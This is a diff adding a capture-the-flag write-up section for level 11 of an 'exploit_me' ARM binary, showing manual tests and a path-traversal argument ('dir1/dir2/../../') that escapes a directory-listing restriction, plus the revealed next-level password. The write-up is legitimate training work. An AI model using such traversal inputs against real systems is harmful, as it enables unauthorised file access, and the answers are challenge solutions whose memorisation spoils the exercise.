@@ -1435,3 +1435,27 @@ dvader            -                17Aug26         0.00s  0.01s lightdm --sessio
 
 Level 11 Password: "Violet"
 ```
+
+# exploit_me ARM binary - level 11:
+```
+Strategy - manual testing:
+└─$ ./exploit Violet ./dir 
+Only directory ./dir1/dir2/ and subdirectories may be listed!
+
+└─$ ./exploit Violet dir1/dir2/test.txt 
+dir1/dir2/test.txt
+
+└─$ ./exploit Violet dir1/dir2/        
+test.txt
+
+└─$ ./exploit Violet dir1/dir2../../../../../../../
+ls: cannot access 'dir1/dir2../../../../../../../': No such file or directory
+```
+
+```
+successful - next password:
+└─$ ./exploit Violet dir1/dir2/../../                       
+arm  arm64  core.919813  dir1  exploit  exploit64  exploit_strings.txt  level10  level11  level2  level3  level4  level7  level8  level9
+
+Level 12 Password: "ropeme"
+```
